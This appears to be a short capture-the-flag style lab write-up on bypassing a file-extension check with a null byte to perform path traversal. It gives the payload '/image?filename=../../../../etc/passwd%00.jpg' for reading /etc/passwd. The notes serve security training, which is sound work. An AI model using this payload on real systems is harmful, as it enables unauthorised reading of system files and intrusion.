Title: File path traversal, validation of file extension with null byte bypass
Level: Practitioner
Desc: This lab contains a path traversal vulnerability in the display of product images.
The application validates that the supplied filename ends with the expected file extension.
To solve the lab, retrieve the contents of the /etc/passwd file. 

So, the null byte `%00` has that feature, that everything after it could be not relevant, interesting.

payload: `/image?filename=../../../../etc/passwd%00.jpg`
![image](https://github.com/user-attachments/assets/ecbc620f-4343-4a14-9e6a-4eebbb925011)
